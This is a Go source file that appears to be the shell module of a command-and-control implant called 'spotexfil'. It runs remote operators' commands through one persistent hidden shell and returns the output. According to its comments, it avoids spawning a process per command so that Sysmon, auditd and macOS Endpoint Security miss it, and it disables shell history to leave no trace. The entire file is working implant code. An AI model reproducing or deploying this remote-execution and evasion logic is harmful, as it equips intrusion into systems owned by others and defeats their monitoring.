package c2

import (
	"bufio"
	"fmt"
	"io"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/sourcefrenchy/spotexfil/internal/shared"
)

// ShellModule executes shell commands and captures output.
type ShellModule struct{}

func (m *ShellModule) Name() string { return "shell" }

// shellWorker is one long-lived shell child process. Running every operator
// command through a single persistent shell (instead of a fresh `sh -c` per
// command) avoids an execve per command, which is a loud behavioral signature
// on hosts with process-creation auditing (Sysmon / auditd / macOS Endpoint
// Security). It also makes shell state (cwd, env, functions) persist between
// commands.
type shellWorker struct {
	cmd   *exec.Cmd
	stdin io.WriteCloser
	lines chan string   // one stdout/stderr line per send
	dead  chan struct{} // closed by readLoop when the shell process exits
	quit  chan struct{} // closed to unblock readLoop when we kill the worker
}

var (
	shellMu         sync.Mutex   // serializes Execute; the implant runs modules in goroutines
	worker          *shellWorker // package-level singleton, spawned lazily
	sentinelCounter int          // per-command nonce so stale sentinels can't confuse the parser
)

// readLoop pumps merged stdout/stderr lines to w.lines until the shell exits.
// It is the only caller of cmd.Wait() (reaps the child; no zombies).
func (w *shellWorker) readLoop(r io.ReadCloser) {
	defer close(w.dead)
	defer func() { _ = w.cmd.Wait() }()
	defer func() { _ = r.Close() }()

	br := bufio.NewReaderSize(r, 64*1024)
	for {
		line, err := br.ReadString('\n')
		if line != "" {
			line = strings.TrimRight(line, "\n")
			line = strings.TrimRight(line, "\r")
			select {
			case w.lines <- line:
			case <-w.quit:
				// Worker was killed (timeout / reset). Exit without
				// blocking forever on a channel nobody drains.
				return
			}
		}
		if err != nil {
			return // EOF / broken pipe: the shell is gone
		}
	}
}

// startShellWorker spawns the persistent shell child.
func startShellWorker() (*shellWorker, error) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		// /Q turns echo off so cmd.exe does not echo each command line
		// back into the output stream.
		cmd = exec.Command("cmd.exe", "/Q")
	} else {
		// stdin is a pipe, so sh runs non-interactively: no prompt, no echo.
		cmd = exec.Command("sh")
	}
	// Harden the child environment so any interactive-ish shell spawned
	// cannot write history. Later entries win on Unix exec; on Windows
	// these are harmless no-ops.
	cmd.Env = append(os.Environ(), "HISTFILE=/dev/null", "HISTSIZE=0")

	stdin, err := cmd.StdinPipe()
	if err != nil {
		return nil, err
	}
	// Merge stderr into stdout via a single pipe, matching the old
	// CombinedOutput() behavior.
	r, wp, err := os.Pipe()
	if err != nil {
		return nil, err
	}
	cmd.Stdout = wp
	cmd.Stderr = wp

	if err := cmd.Start(); err != nil {
		_ = r.Close()
		_ = wp.Close()
		return nil, err
	}
	// Parent drops its copy of the write end so the reader sees EOF when
	// the child exits.
	_ = wp.Close()

	w := &shellWorker{
		cmd:   cmd,
		stdin: stdin,
		lines: make(chan string),
		dead:  make(chan struct{}),
		quit:  make(chan struct{}),
	}
	go w.readLoop(r)
	return w, nil
}

// ensureWorkerLocked returns the live worker, transparently respawning it if
// it never started or has exited (e.g. operator ran `exit`). Shell state
// (cwd, env) is lost on respawn; that is an accepted tradeoff.
// Callers must hold shellMu.
func ensureWorkerLocked() (*shellWorker, error) {
	if worker != nil {
		select {
		case <-worker.dead:
			worker = nil
		default:
		}
	}
	if worker == nil {
		w, err := startShellWorker()
		if err != nil {
			return nil, err
		}
		worker = w
	}
	return worker, nil
}

// killWorkerLocked kills and discards the current worker. Callers must hold
// shellMu. The readLoop goroutine reaps the process via cmd.Wait().
func killWorkerLocked() {
	if worker == nil {
		return
	}
	close(worker.quit)
	if worker.cmd.Process != nil {
		_ = worker.cmd.Process.Kill()
	}
	worker = nil
}

// ResetShellWorker kills and discards the persistent shell worker. The next
// Execute lazily spawns a fresh one. Used by tests; may be wired to implant
// shutdown in the future.
func ResetShellWorker() {
	shellMu.Lock()
	defer shellMu.Unlock()
	killWorkerLocked()
}

func (m *ShellModule) Execute(args map[string]interface{}) (string, string) {
	cmdStr, _ := args["cmd"].(string)
	if cmdStr == "" {
		return "error", "Empty command"
	}

	// The whole command round-trip runs under the mutex: commands on a
	// single shared shell cannot interleave.
	shellMu.Lock()
	defer shellMu.Unlock()

	w, err := ensureWorkerLocked()
	if err != nil {
		return "error", "failed to start shell worker: " + err.Error()
	}

	// Sentinel framing: after the command, echo a unique sentinel followed
	// by the exit code. Lines are consumed until one starts with the
	// sentinel; everything before it is the command output.
	sentinelCounter++
	sentinel := fmt.Sprintf("__SPOTEXFIL_DONE_%d__", sentinelCounter)
	var frame string
	if runtime.GOOS == "windows" {
		frame = cmdStr + "\r\necho " + sentinel + "%ERRORLEVEL%\r\n"
	} else {
		frame = cmdStr + "\necho " + sentinel + "$?\n"
	}

	if _, err := io.WriteString(w.stdin, frame); err != nil {
		killWorkerLocked()
		return "error", "shell worker write failed: " + err.Error()
	}

	timeout := time.Duration(shared.Proto.C2.ShellTimeout) * time.Second
	timer := time.NewTimer(timeout)
	defer timer.Stop()

	var lines []string
	for {
		select {
		case line := <-w.lines:
			if strings.HasPrefix(line, sentinel) {
				code, _ := strconv.Atoi(strings.TrimSpace(strings.TrimPrefix(line, sentinel)))
				output := finishShellOutput(cmdStr, lines)
				if code != 0 {
					return "error", output
				}
				return "ok", output
			}
			lines = append(lines, line)
		case <-w.dead:
			// Shell exited mid-command (e.g. operator ran `exit`).
			// readLoop already reaped it; drop the handle so the next
			// Execute lazily spawns a fresh worker (shell state is lost,
			// which is an accepted and documented tradeoff).
			worker = nil
			return "error", "shell worker exited (state lost; restarted on next command)"
		case <-timer.C:
			// Kill the wedged shell; the next Execute lazily spawns a
			// fresh worker. State loss is acceptable here.
			killWorkerLocked()
			return "error", "Command timed out after " + timeout.String() + " (shell worker restarted)"
		}
	}
}

// finishShellOutput joins captured lines, strips cmd.exe's residual command
// echo on Windows, and caps the result at MaxResultSize.
func finishShellOutput(cmdStr string, lines []string) string {
	// cmd.exe may echo the command line despite /Q on some builds; strip a
	// leading line that exactly matches the sent command.
	if runtime.GOOS == "windows" && len(lines) > 0 && lines[0] == cmdStr {
		lines = lines[1:]
	}

	var sb strings.Builder
	for _, l := range lines {
		sb.WriteString(l)
		sb.WriteString("\n")
	}
	result := sb.String()

	maxSize := shared.Proto.C2.MaxResultSize
	if len(result) > maxSize {
		result = result[:maxSize] + "\n[truncated]"
	}
	return result
}
